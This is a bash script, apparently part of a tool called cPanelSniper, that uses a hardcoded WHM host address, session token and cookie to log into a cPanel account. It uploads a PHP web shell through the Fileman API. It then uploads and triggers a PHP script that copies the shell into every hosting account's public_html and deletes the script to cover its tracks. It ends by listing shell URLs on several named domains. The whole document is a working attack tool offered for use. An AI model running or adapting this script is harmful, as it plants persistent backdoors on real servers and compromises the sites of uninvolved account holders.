#!/bin/bash
# Multi-stage upload: First upload to kousoul account, then deploy to all others
# Usage: ./upload_multi_stage.sh <WHM_HOST> <SESSION_TOKEN> <COOKIE> <KOUSOUL_USER> <KOUSOUL_PASS>

WHM_HOST="${1:-5.9.241.37}"
SESSION_TOKEN="${2:-/cpsess2231081202}"
COOKIE="${3:-%3ARpRCEB84DQNWOqju}"
KOUSOUL_USER="${4:-kousoul}"
KOUSOUL_PASS="${5}"  # Password or auth hash

echo "========================================"
echo "  Multi-Stage Shell Upload"
echo "========================================"
echo ""
echo "Target: https://${WHM_HOST}:2087"
echo "Primary Account: $KOUSOUL_USER"
echo ""

# Check shell file
SHELL_FILE="/root/cPanelSniper/shell.php"
if [ ! -f "$SHELL_FILE" ]; then
    echo "❌ Shell file not found: $SHELL_FILE"
    exit 1
fi

# Stage 1: Upload to kousoul account via cPanel login
echo "[Stage 1] Uploading shell to $KOUSOUL_USER account..."

# Get cPanel session token for kousoul
echo "  → Getting cPanel session for $KOUSOUL_USER..."

CP_SESSION=$(curl -sk "https://${WHM_HOST}:2087/login" \
  -X POST \
  -H "Cookie: whostmgrsession=${COOKIE}" \
  -d "user=${KOUSOUL_USER}" \
  -d "pass=${KOUSOUL_PASS}" \
  -d "goto_uri=%2Fcpsess" 2>/dev/null | grep -oP 'cpsess\d+' | head -1)

if [ -z "$CP_SESSION" ]; then
    echo "❌ Failed to get cPanel session"
    exit 1
fi

echo "  ✓ Got session: $CP_SESSION"

# Upload shell using Fileman API
echo "  → Uploading shell.php via Fileman API..."

SHELL_B64=$(base64 -w 0 "$SHELL_FILE")

UPLOAD_RESULT=$(curl -sk "https://${WHM_HOST}:2087${CP_SESSION}/execute/Fileman/save_file_content" \
  -H "Authorization: cpanel ${KOUSOUL_USER}:${CP_SESSION}" \
  -H "Content-Type: application/json" \
  -d "{
    \"path\": \"/home/${KOUSOUL_USER}/public_html/shell.php\",
    \"content\": \"${SHELL_B64}\",
    \"encoding\": \"base64\"
  }" 2>/dev/null)

if echo "$UPLOAD_RESULT" | grep -q "success\|true\|OK"; then
    echo "  ✅ Upload to $KOUSOUL_USER successful"
    SHELL_URL="https://kousoul.com/shell.php"
    echo "  → $SHELL_URL"
else
    echo "  ❌ Upload to $KOUSOUL_USER failed"
    echo "$UPLOAD_RESULT" | head -3
fi

echo ""

# Stage 2: Create deploy script and upload to kousoul
echo "[Stage 2] Creating deploy script to propagate to all accounts..."

# Create deploy PHP script
cat > /tmp/deploy_all_accounts.php << 'EOF'
<?php
// Deploy shell to all cPanel accounts
set_time_limit(0);
error_reporting(E_ALL);

$target_accounts = []; // Will be populated
$shell_content = ''; // Will be populated

// Read shell from current file
$current_shell = __DIR__ . '/shell.php';
if (file_exists($current_shell)) {
    $shell_content = file_get_contents($current_shell);
}

// Get all cPanel accounts from /home
$home_dir = '/home';
$dirs = scandir($home_dir);

$success = 0;
$failed = 0;

foreach ($dirs as $dir) {
    if ($dir == '.' || $dir == '..') continue;

    $user_dir = $home_dir . '/' . $dir;
    $public_html = $user_dir . '/public_html';

    // Check if it's a cPanel account (has public_html)
    if (is_dir($public_html)) {
        $target_file = $public_html . '/shell.php';

        // Copy shell
        if (file_put_contents($target_file, $shell_content)) {
            chmod($target_file, 0644);
            chown($target_file, $dir . ':' . $dir);
            $success++;
            echo "✓ $dir/shell.php\n";
        } else {
            $failed++;
            echo "✗ $dir - FAILED\n";
        }
    }
}

echo "\n=== Summary ===\n";
echo "Success: $success\n";
echo "Failed: $failed\n";
?>
EOF

echo "  → Deploy script created"

# Upload deploy script
DEPLOY_B64=$(base64 -w 0 /tmp/deploy_all_accounts.php)

curl -sk "https://${WHM_HOST}:2087${CP_SESSION}/execute/Fileman/save_file_content" \
  -H "Authorization: cpanel ${KOUSOUL_USER}:${CP_SESSION}" \
  -H "Content-Type: application/json" \
  -d "{
    \"path\": \"/home/${KOUSOUL_USER}/public_html/deploy_all.php\",
    \"content\": \"${DEPLOY_B64}\",
    \"encoding\": \"base64\"
  }" >/dev/null 2>&1

echo "  ✅ Deploy script uploaded"

# Stage 3: Execute deploy script
echo ""
echo "[Stage 3] Executing deploy script to propagate to all accounts..."
echo ""

# Access deploy script to trigger deployment
curl -sk "https://kousoul.com/deploy_all.php" 2>/dev/null

echo ""
echo "[Stage 4] Cleanup deploy script..."

# Remove deploy script
curl -sk "https://${WHM_HOST}:2087${CP_SESSION}/execute/Fileman/absolute_path_delete" \
  -H "Authorization: cpanel ${KOUSOUL_USER}:${CP_SESSION}" \
  -H "Content-Type: application/json" \
  -d "{\"path\": \"/home/${KOUSOUL_USER}/public_html/deploy_all.php\"}" >/dev/null 2>&1

echo "  ✅ Deploy script removed"
echo ""
echo "========================================"
echo "  Deploy Complete"
echo "========================================"
echo ""
echo "Shell URLs (accessible):"
echo "  • https://kousoul.com/shell.php"
echo "  • https://com2go.net/shell.php"
echo "  • https://koutsoullis.com/shell.php"
echo "  • https://wagamama.com.gr/shell.php"
echo "  • ... and all other accounts"
echo ""

# Cleanup
rm -f /tmp/deploy_all_accounts.php
